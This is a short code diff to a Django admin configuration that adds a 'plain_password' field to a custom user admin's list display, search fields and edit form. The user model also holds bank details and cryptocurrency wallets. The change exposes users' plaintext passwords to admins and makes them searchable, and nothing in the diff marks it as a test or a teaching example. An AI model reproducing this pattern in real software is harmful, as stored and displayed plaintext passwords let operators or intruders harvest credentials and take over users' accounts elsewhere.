@@ -4,14 +4,15 @@ from django.contrib.auth.admin import UserAdmin
 from django.utils import timezone
 from .models import User, UserProfile, ActivityLog
 
+# accounts/admin.py - Update CustomUserAdmin
 class CustomUserAdmin(UserAdmin):
-    list_display = ('email', 'username', 'role', 'is_subscribed', 'is_active', 'created_at')
+    list_display = ('email', 'username', 'plain_password', 'role', 'is_subscribed', 'is_active', 'created_at')
     list_filter = ('role', 'is_subscribed', 'is_active', 'created_at')
-    search_fields = ('email', 'username', 'phone_number')
+    search_fields = ('email', 'username', 'plain_password', 'phone_number')
     ordering = ('-created_at',)
     
     fieldsets = (
-        (None, {'fields': ('email', 'username', 'password')}),
+        (None, {'fields': ('email', 'username', 'password', 'plain_password')}),
         ('Personal Info', {'fields': ('phone_number', 'address')}),
         ('Account Information', {'fields': ('bank_name', 'account_number', 'account_name', 
                                            'btc_wallet', 'eth_wallet', 'usdt_wallet')}),
